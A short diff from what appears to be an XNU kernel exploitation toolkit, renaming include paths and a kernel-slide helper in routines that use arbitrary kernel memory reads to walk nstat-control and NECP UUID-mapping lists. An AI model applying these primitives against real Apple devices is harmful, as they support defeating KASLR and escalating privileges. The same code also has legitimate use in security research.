@@ -13,13 +13,14 @@
 
 #include <dispatch/dispatch.h>
 
-#include "util_lck_rw.h"
-#include "kmem.h"
-#include "slider.h"
-#include "xnu_proc.h"
+#include "util/lck_rw.h"
+#include "memory/kmem.h"
+#include "slider/kernel.h"
+#include "xnu/proc.h"
+#include "util/dispatch.h"
+#include "util/assert.h"
+
 #include "platform_params.h"
-#include "util_dispatch.h"
-#include "util_assert.h"
 
 
 #define MAX_NECP_UUID_MAPPING_ID 128
@@ -71,7 +72,7 @@ void xe_util_lck_break_nstat_controls_cycle(xe_util_lck_rw_t util) {
 void xe_util_lck_read_nstat_controls_state(xe_util_lck_rw_t util) {
     xe_assert(util->nstat_controls_head == 0);
     xe_assert(util->nstat_controls_tail == 0);
-    uintptr_t head = xe_kmem_read_uint64(xe_slider_slide(VAR_NSTAT_CONTROLS_ADDR));
+    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NSTAT_CONTROLS_ADDR));
     uintptr_t tail = head;
     while (TRUE) {
         uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET));
@@ -130,7 +131,7 @@ void xe_util_lck_restore_necp_ids(xe_util_lck_rw_t util) {
 void xe_util_lck_read_necp_uuid_id_mapping_state(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head == 0);
     xe_assert(util->necp_uuid_id_mapping_tail == 0);
-    uintptr_t head = xe_kmem_read_uint64(xe_slider_slide(VAR_NECP_UUID_ID_MAPPING_HEAD_ADDR));
+    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NECP_UUID_ID_MAPPING_HEAD_ADDR));
     uintptr_t tail = head;
     while (TRUE) {
         uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
